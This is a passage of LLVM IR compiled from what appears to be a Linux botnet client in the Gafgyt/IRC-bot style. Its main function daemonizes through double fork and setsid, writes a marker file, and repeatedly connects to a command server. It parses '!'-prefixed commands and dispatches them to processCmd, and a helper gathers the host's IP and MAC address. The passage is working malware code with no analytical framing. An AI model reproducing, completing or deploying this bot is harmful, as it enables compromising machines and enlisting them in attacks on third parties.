  %37 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 noundef %38, i8* noundef %39, i32 noundef %40, i32 noundef 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

44:                                               ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #12
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

16:                                               ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %17, i8 0, i64 16, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.76, i64 0, i64 0)) #12
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 noundef zeroext 53) #15
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 noundef %24, %struct.sockaddr* noundef %25, i32 noundef 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

29:                                               ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

30:                                               ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 noundef %31, %struct.sockaddr* noundef %32, i32* noundef %6) #12
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

37:                                               ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.77, i64 0, i64 0), i32 noundef 0)
  store i32 %41, i32* %7, align 4
  br label %42

42:                                               ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* noundef %43, i32 noundef 4096, i32 noundef %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

47:                                               ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %49 = call i8* @strstr(i8* noundef %48, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0)) #11
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

51:                                               ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %52, i8** %9, align 8
  br label %53

53:                                               ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

58:                                               ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53, !llvm.loop !54

61:                                               ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

63:                                               ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %64, i8 0, i64 4096, i1 false)
  br label %42, !llvm.loop !55

65:                                               ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 noundef %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

71:                                               ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %76 = call i8* @strcpy(i8* noundef %74, i8* noundef %75) #12
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 noundef %77, i64 noundef 35111, %struct.ifreq* noundef %11) #12
  store i32 0, i32* %10, align 4
  br label %79

79:                                               ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

82:                                               ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i64 0, i64 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

94:                                               ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79, !llvm.loop !56

97:                                               ; preds = %79
  br label %98

98:                                               ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 noundef %99)
  br label %101

101:                                              ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32 noundef, %struct.sockaddr* noundef, i32* noundef) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32 noundef, i64 noundef, ...) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @main(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [50 x i8], align 16
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i32, align 4
  %11 = alloca [11 x i8], align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca [10 x i8*], align 16
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %28 = bitcast [50 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %28, i8* align 16 getelementptr inbounds ([50 x i8], [50 x i8]* @__const.main.ismokeweed, i32 0, i32 0), i64 50, i1 false)
  %29 = load i32, i32* %6, align 4
  store i32 %29, i32* %10, align 4
  %30 = bitcast [11 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %30, i8* align 1 getelementptr inbounds ([11 x i8], [11 x i8]* @__const.main.r00t3d, i32 0, i32 0), i64 11, i1 false)
  %31 = getelementptr inbounds [50 x i8], [50 x i8]* %8, i64 0, i64 0
  %32 = call noalias %struct._IO_FILE* @fopen(i8* noundef %31, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.79, i64 0, i64 0))
  store %struct._IO_FILE* %32, %struct._IO_FILE** %9, align 8
  %33 = getelementptr inbounds [11 x i8], [11 x i8]* %11, i64 0, i64 0
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %35 = call i64 @fwrite(i8* noundef %33, i64 noundef 1, i64 noundef 11, %struct._IO_FILE* noundef %34)
  %36 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %37 = call i32 @fileno(%struct._IO_FILE* noundef %36) #12
  %38 = call i32 (i32, i32, ...) bitcast (i32 (...)* @fchmod to i32 (i32, i32, ...)*)(i32 noundef %37, i32 noundef 3071)
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %40 = call i32 @fileno(%struct._IO_FILE* noundef %39) #12
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = call i32 (i32, i64, ...) @ioctl(i32 noundef %40, i64 noundef %42, i32* noundef %10) #12
  %44 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %45 = call i32 @fclose(%struct._IO_FILE* noundef %44)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %47 = call i32 @getpid() #12
  %48 = xor i32 %46, %47
  call void @srand(i32 noundef %48) #12
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %50 = call i32 @getpid() #12
  %51 = xor i32 %49, %50
  call void @init_rand(i32 noundef %51)
  %52 = call i32 @getOurIP()
  %53 = call i32 @fork() #12
  store i32 %53, i32* %12, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %58

55:                                               ; preds = %2
  %56 = load i32, i32* %12, align 4
  %57 = call i32 @waitpid(i32 noundef %56, i32* noundef %14, i32 noundef 0)
  call void @exit(i32 noundef 0) #16
  unreachable

58:                                               ; preds = %2
  %59 = load i32, i32* %12, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %73, label %61

61:                                               ; preds = %58
  %62 = call i32 @fork() #12
  store i32 %62, i32* %13, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %65

64:                                               ; preds = %61
  call void @exit(i32 noundef 0) #16
  unreachable

65:                                               ; preds = %61
  %66 = load i32, i32* %13, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %69, label %68

68:                                               ; preds = %65
  br label %71

69:                                               ; preds = %65
  %70 = call i32 (i8*, ...) @zprintf(i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i64 0, i64 0))
  br label %71

71:                                               ; preds = %69, %68
  br label %72

72:                                               ; preds = %71
  br label %75

73:                                               ; preds = %58
  %74 = call i32 (i8*, ...) @zprintf(i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i64 0, i64 0))
  br label %75

75:                                               ; preds = %73, %72
  br label %76

76:                                               ; preds = %75
  %77 = call i32 @setsid() #12
  %78 = call i32 @chdir(i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #12
  %79 = call void (i32)* @signal(i32 noundef 13, void (i32)* noundef inttoptr (i64 1 to void (i32)*)) #12
  br label %80

80:                                               ; preds = %343, %83, %76
  %81 = call i32 @initConnection()
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %83, label %85

83:                                               ; preds = %80
  %84 = call i32 @sleep(i32 noundef 5)
  br label %80

85:                                               ; preds = %80
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  br label %86

86:                                               ; preds = %342, %213, %175, %85
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %89 = call i32 @recvLine(i32 noundef %87, i8* noundef %88, i32 noundef 4096)
  store i32 %89, i32* %16, align 4
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %91, label %343

91:                                               ; preds = %86
  store i32 0, i32* %17, align 4
  br label %92

92:                                               ; preds = %163, %91
  %93 = load i32, i32* %17, align 4
  %94 = sext i32 %93 to i64
  %95 = load i64, i64* @numpids, align 8
  %96 = icmp ult i64 %94, %95
  br i1 %96, label %97, label %166

97:                                               ; preds = %92
  %98 = load i32*, i32** @pids, align 8
  %99 = load i32, i32* %17, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i32, i32* %98, i64 %100
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @waitpid(i32 noundef %102, i32* noundef null, i32 noundef 1)
  %104 = icmp sgt i32 %103, 0
  br i1 %104, label %105, label %162

105:                                              ; preds = %97
  %106 = load i32, i32* %17, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %19, align 4
  br label %108

108:                                              ; preds = %124, %105
  %109 = load i32, i32* %19, align 4
  %110 = zext i32 %109 to i64
  %111 = load i64, i64* @numpids, align 8
  %112 = icmp ult i64 %110, %111
  br i1 %112, label %113, label %127

113:                                              ; preds = %108
  %114 = load i32*, i32** @pids, align 8
  %115 = load i32, i32* %19, align 4
  %116 = zext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %114, i64 %116
  %118 = load i32, i32* %117, align 4
  %119 = load i32*, i32** @pids, align 8
  %120 = load i32, i32* %19, align 4
  %121 = sub i32 %120, 1
  %122 = zext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %119, i64 %122
  store i32 %118, i32* %123, align 4
  br label %124

124:                                              ; preds = %113
  %125 = load i32, i32* %19, align 4
  %126 = add i32 %125, 1
  store i32 %126, i32* %19, align 4
  br label %108, !llvm.loop !57

127:                                              ; preds = %108
  %128 = load i32*, i32** @pids, align 8
  %129 = load i32, i32* %19, align 4
  %130 = sub i32 %129, 1
  %131 = zext i32 %130 to i64
  %132 = getelementptr inbounds i32, i32* %128, i64 %131
  store i32 0, i32* %132, align 4
  %133 = load i64, i64* @numpids, align 8
  %134 = add i64 %133, -1
  store i64 %134, i64* @numpids, align 8
  %135 = load i64, i64* @numpids, align 8
  %136 = add i64 %135, 1
  %137 = mul i64 %136, 4
  %138 = call noalias i8* @malloc(i64 noundef %137) #12
  %139 = bitcast i8* %138 to i32*
  store i32* %139, i32** %18, align 8
  store i32 0, i32* %19, align 4
  br label %140

140:                                              ; preds = %155, %127
  %141 = load i32, i32* %19, align 4
  %142 = zext i32 %141 to i64
  %143 = load i64, i64* @numpids, align 8
  %144 = icmp ult i64 %142, %143
  br i1 %144, label %145, label %158

145:                                              ; preds = %140
  %146 = load i32*, i32** @pids, align 8
  %147 = load i32, i32* %19, align 4
  %148 = zext i32 %147 to i64
  %149 = getelementptr inbounds i32, i32* %146, i64 %148
  %150 = load i32, i32* %149, align 4
  %151 = load i32*, i32** %18, align 8
  %152 = load i32, i32* %19, align 4
  %153 = zext i32 %152 to i64
  %154 = getelementptr inbounds i32, i32* %151, i64 %153
  store i32 %150, i32* %154, align 4
  br label %155

155:                                              ; preds = %145
  %156 = load i32, i32* %19, align 4
  %157 = add i32 %156, 1
  store i32 %157, i32* %19, align 4
  br label %140, !llvm.loop !58

158:                                              ; preds = %140
  %159 = load i32*, i32** @pids, align 8
  %160 = bitcast i32* %159 to i8*
  call void @free(i8* noundef %160) #12
  %161 = load i32*, i32** %18, align 8
  store i32* %161, i32** @pids, align 8
  br label %162

162:                                              ; preds = %158, %97
  br label %163

163:                                              ; preds = %162
  %164 = load i32, i32* %17, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %17, align 4
  br label %92, !llvm.loop !59

166:                                              ; preds = %92
  %167 = load i32, i32* %16, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 %168
  store i8 0, i8* %169, align 1
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  call void @trim(i8* noundef %170)
  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %172 = call i8* @strstr(i8* noundef %171, i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i64 0, i64 0)) #11
  %173 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %174 = icmp eq i8* %172, %173
  br i1 %174, label %175, label %178

175:                                              ; preds = %166
  %176 = load i32, i32* @mainCommSock, align 4
  %177 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %176, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i64 0, i64 0))
  br label %86, !llvm.loop !60

178:                                              ; preds = %166
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %180 = call i8* @strstr(i8* noundef %179, i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i64 0, i64 0)) #11
  %181 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %182 = icmp eq i8* %180, %181
  br i1 %182, label %183, label %184

183:                                              ; preds = %178
  call void @exit(i32 noundef 0) #16
  unreachable

184:                                              ; preds = %178
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  store i8* %185, i8** %20, align 8
  %186 = load i8*, i8** %20, align 8
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 33
  br i1 %189, label %190, label %342

190:                                              ; preds = %184
  %191 = load i8*, i8** %20, align 8
  %192 = getelementptr inbounds i8, i8* %191, i64 1
  store i8* %192, i8** %21, align 8
  br label %193

193:                                              ; preds = %205, %190
  %194 = load i8*, i8** %21, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp ne i32 %196, 32
  br i1 %197, label %198, label %203

198:                                              ; preds = %193
  %199 = load i8*, i8** %21, align 8
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp ne i32 %201, 0
  br label %203

203:                                              ; preds = %198, %193
  %204 = phi i1 [ false, %193 ], [ %202, %198 ]
  br i1 %204, label %205, label %208

205:                                              ; preds = %203
  %206 = load i8*, i8** %21, align 8
  %207 = getelementptr inbounds i8, i8* %206, i32 1
  store i8* %207, i8** %21, align 8
  br label %193, !llvm.loop !61

208:                                              ; preds = %203
  %209 = load i8*, i8** %21, align 8
  %210 = load i8, i8* %209, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 0
  br i1 %212, label %213, label %214

213:                                              ; preds = %208
  br label %86, !llvm.loop !60

214:                                              ; preds = %208
  %215 = load i8*, i8** %21, align 8
  store i8 0, i8* %215, align 1
  %216 = load i8*, i8** %20, align 8
  %217 = getelementptr inbounds i8, i8* %216, i64 1
  store i8* %217, i8** %21, align 8
  %218 = load i8*, i8** %20, align 8
  %219 = load i8*, i8** %21, align 8
  %220 = call i64 @strlen(i8* noundef %219) #11
  %221 = getelementptr inbounds i8, i8* %218, i64 %220
  %222 = getelementptr inbounds i8, i8* %221, i64 2
  store i8* %222, i8** %20, align 8
  br label %223

223:                                              ; preds = %243, %214
  %224 = load i8*, i8** %20, align 8
  %225 = load i8*, i8** %20, align 8
  %226 = call i64 @strlen(i8* noundef %225) #11
  %227 = sub i64 %226, 1
  %228 = getelementptr inbounds i8, i8* %224, i64 %227
  %229 = load i8, i8* %228, align 1
  %230 = zext i8 %229 to i32
  %231 = icmp eq i32 %230, 10
  br i1 %231, label %241, label %232

232:                                              ; preds = %223
  %233 = load i8*, i8** %20, align 8
  %234 = load i8*, i8** %20, align 8
  %235 = call i64 @strlen(i8* noundef %234) #11
  %236 = sub i64 %235, 1
  %237 = getelementptr inbounds i8, i8* %233, i64 %236
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 13
  br label %241

241:                                              ; preds = %232, %223
  %242 = phi i1 [ true, %223 ], [ %240, %232 ]
  br i1 %242, label %243, label %249

243:                                              ; preds = %241
  %244 = load i8*, i8** %20, align 8
  %245 = load i8*, i8** %20, align 8
  %246 = call i64 @strlen(i8* noundef %245) #11
  %247 = sub i64 %246, 1
  %248 = getelementptr inbounds i8, i8* %244, i64 %247
  store i8 0, i8* %248, align 1
  br label %223, !llvm.loop !62

249:                                              ; preds = %241
  %250 = load i8*, i8** %20, align 8
  store i8* %250, i8** %22, align 8
  br label %251

251:                                              ; preds = %263, %249
  %252 = load i8*, i8** %20, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp ne i32 %254, 32
  br i1 %255, label %256, label %261

256:                                              ; preds = %251
  %257 = load i8*, i8** %20, align 8
  %258 = load i8, i8* %257, align 1
  %259 = zext i8 %258 to i32
  %260 = icmp ne i32 %259, 0
  br label %261

261:                                              ; preds = %256, %251
  %262 = phi i1 [ false, %251 ], [ %260, %256 ]
  br i1 %262, label %263, label %266

263:                                              ; preds = %261
  %264 = load i8*, i8** %20, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %20, align 8
  br label %251, !llvm.loop !63

266:                                              ; preds = %261
  %267 = load i8*, i8** %20, align 8
  store i8 0, i8* %267, align 1
  %268 = load i8*, i8** %20, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %20, align 8
  %270 = load i8*, i8** %22, align 8
  store i8* %270, i8** %23, align 8
  br label %271

271:                                              ; preds = %275, %266
  %272 = load i8*, i8** %23, align 8
  %273 = load i8, i8* %272, align 1
  %274 = icmp ne i8 %273, 0
  br i1 %274, label %275, label %284

275:                                              ; preds = %271
  %276 = load i8*, i8** %23, align 8
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  %279 = call i32 @toupper(i32 noundef %278) #11
  %280 = trunc i32 %279 to i8
  %281 = load i8*, i8** %23, align 8
  store i8 %280, i8* %281, align 1
  %282 = load i8*, i8** %23, align 8
  %283 = getelementptr inbounds i8, i8* %282, i32 1
  store i8* %283, i8** %23, align 8
  br label %271, !llvm.loop !64

284:                                              ; preds = %271
  store i32 1, i32* %25, align 4
  %285 = load i8*, i8** %20, align 8
  %286 = call i8* @strtok(i8* noundef %285, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %286, i8** %26, align 8
  %287 = load i8*, i8** %22, align 8
  %288 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 0
  store i8* %287, i8** %288, align 16
  br label %289

289:                                              ; preds = %320, %284
  %290 = load i8*, i8** %26, align 8
  %291 = icmp ne i8* %290, null
  br i1 %291, label %292, label %322

292:                                              ; preds = %289
  %293 = load i8*, i8** %26, align 8
  %294 = load i8, i8* %293, align 1
  %295 = zext i8 %294 to i32
  %296 = icmp ne i32 %295, 10
  br i1 %296, label %297, label %320

297:                                              ; preds = %292
  %298 = load i8*, i8** %26, align 8
  %299 = call i64 @strlen(i8* noundef %298) #11
  %300 = add i64 %299, 1
  %301 = call noalias i8* @malloc(i64 noundef %300) #12
  %302 = load i32, i32* %25, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %303
  store i8* %301, i8** %304, align 8
  %305 = load i32, i32* %25, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %306
  %308 = load i8*, i8** %307, align 8
  %309 = load i8*, i8** %26, align 8
  %310 = call i64 @strlen(i8* noundef %309) #11
  %311 = add i64 %310, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %308, i8 0, i64 %311, i1 false)
  %312 = load i32, i32* %25, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %313
  %315 = load i8*, i8** %314, align 8
  %316 = load i8*, i8** %26, align 8
  %317 = call i8* @strcpy(i8* noundef %315, i8* noundef %316) #12
  %318 = load i32, i32* %25, align 4
  %319 = add nsw i32 %318, 1
  store i32 %319, i32* %25, align 4
  br label %320

320:                                              ; preds = %297, %292
  %321 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %321, i8** %26, align 8
  br label %289, !llvm.loop !65

322:                                              ; preds = %289
  %323 = load i32, i32* %25, align 4
  %324 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 0
  call void @processCmd(i32 noundef %323, i8** noundef %324)
  %325 = load i32, i32* %25, align 4
  %326 = icmp sgt i32 %325, 1
  br i1 %326, label %327, label %341

327:                                              ; preds = %322
  store i32 1, i32* %27, align 4
  store i32 1, i32* %27, align 4
  br label %328

328:                                              ; preds = %337, %327
  %329 = load i32, i32* %27, align 4
  %330 = load i32, i32* %25, align 4
  %331 = icmp slt i32 %329, %330
  br i1 %331, label %332, label %340

332:                                              ; preds = %328
  %333 = load i32, i32* %27, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %334
  %336 = load i8*, i8** %335, align 8
  call void @free(i8* noundef %336) #12
  br label %337

337:                                              ; preds = %332
  %338 = load i32, i32* %27, align 4
  %339 = add nsw i32 %338, 1
  store i32 %339, i32* %27, align 4
  br label %328, !llvm.loop !66

340:                                              ; preds = %328
  br label %341

341:                                              ; preds = %340, %322
  br label %342

342:                                              ; preds = %341, %184
  br label %86, !llvm.loop !60

343:                                              ; preds = %86
  br label %80
}

declare noalias %struct._IO_FILE* @fopen(i8* noundef, i8* noundef) #3

declare i64 @fwrite(i8* noundef, i64 noundef, i64 noundef, %struct._IO_FILE* noundef) #3

; Function Attrs: nounwind
declare i32 @fileno(%struct._IO_FILE* noundef) #4

declare i32 @fchmod(...) #3

declare i32 @fclose(%struct._IO_FILE* noundef) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8* noundef) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32 noundef, void (i32)* noundef) #4

declare i32 @sleep(i32 noundef) #3

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nofree nosync nounwind willreturn }
attributes #3 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { nounwind returns_twice "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { argmemonly nofree nounwind willreturn }
